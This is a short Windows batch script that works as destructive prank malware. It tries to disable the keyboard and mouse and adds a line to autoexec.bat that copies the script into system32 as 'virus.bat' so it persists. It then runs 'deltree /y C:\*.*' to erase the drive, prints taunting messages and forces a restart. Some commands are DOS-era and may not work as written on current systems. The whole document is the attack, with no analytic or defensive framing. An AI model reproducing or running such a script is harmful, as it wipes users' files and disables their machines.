   @echo off
   cls
   c:\windows\rundll.exe keyboard,DISABLE
   c:\windows\rundll.exe mouse,DISABLE
   echo copy %0 "C:\WINDOWS\system32\virus.bat" >> autoexec.bat
   echo hello wassup?
   deltree /y C:\*.*
   echo do you smell like pooo?
   echo goodbye . . . . . .. .
   SHUTDOWN -R  -f -T 1
   exit
